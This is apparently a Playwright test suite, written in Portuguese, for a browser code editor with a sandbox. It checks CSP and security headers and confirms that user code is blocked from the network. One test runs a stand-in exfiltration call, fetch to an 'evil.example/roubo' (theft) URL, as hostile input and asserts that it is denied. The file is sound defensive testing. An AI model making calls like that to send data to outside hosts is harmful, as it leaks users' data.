import { test, expect } from '@playwright/test';

test.describe('Segurança', () => {
  test('resposta traz CSP e headers de segurança', async ({ page }) => {
    const res = await page.goto('/');
    const headers = res!.headers();
    const csp = headers['content-security-policy'] || '';
    expect(csp).toContain("default-src 'self'");
    expect(csp).toContain("connect-src 'self'"); // bloqueia exfiltração
    expect(csp).toContain("frame-ancestors 'none'");
    expect(headers['x-frame-options']).toBe('DENY');
    expect(headers['x-content-type-options']).toBe('nosniff');
  });

  test('a página serve uma única CSP, sem a política do runner', async ({ page }) => {
    const res = await page.goto('/');
    const csp = res!.headers()['content-security-policy'] || '';
    expect(csp.split(';').filter(d => d.trim().startsWith('default-src'))).toEqual(["default-src 'self'"]);
    expect(csp).not.toContain("default-src 'none'");
    expect(csp).not.toContain("'unsafe-eval'");
  });

  // Só vale quando o runner existir em /sandbox/runner.js.
  test.fixme('o runner serve só a CSP restrita e não herda a da página', async ({ request }) => {
    const res = await request.get('/sandbox/runner.js');
    const csp = res.headers()['content-security-policy'] || '';
    expect(csp).toBe("default-src 'none'; script-src 'self' blob:; worker-src blob:; connect-src 'none'; img-src 'none'");
    expect(res.headers()['cross-origin-resource-policy']).toBe('same-origin');
  });

  test('código do usuário não acessa fetch/globais (sandbox)', async ({ page }) => {
    let chamou = false;
    await page.route('https://evil.example/**', route => {
      chamou = true;
      return route.abort();
    });

    await page.goto('/');
    await expect(page.locator('.monaco-editor').first()).toBeVisible({ timeout: 15_000 });

    // Seta via API do Monaco (evita auto-close de aspas/parênteses ao digitar).
    await expect.poll(() => page.evaluate(() => typeof (window as any).monaco)).toBe('object');
    await page.evaluate(() => {
      const m = (window as any).monaco;
      m.editor.getModels()[0].setValue('fetch("https://evil.example/roubo")');
    });
    await page.getByRole('button', { name: /Bota pra moer/i }).click();

    // Deve falhar na execução (global bloqueado) e nunca tocar a rede.
    await expect(page.getByRole('status')).toContainText(/Deu ruim na execução/i, {
      timeout: 15_000,
    });
    await page.getByRole('tab', { name: 'Erros' }).click();
    await expect(page.getByRole('tabpanel')).toContainText(/Acesso negado/i);
    expect(chamou).toBe(false);
  });
});
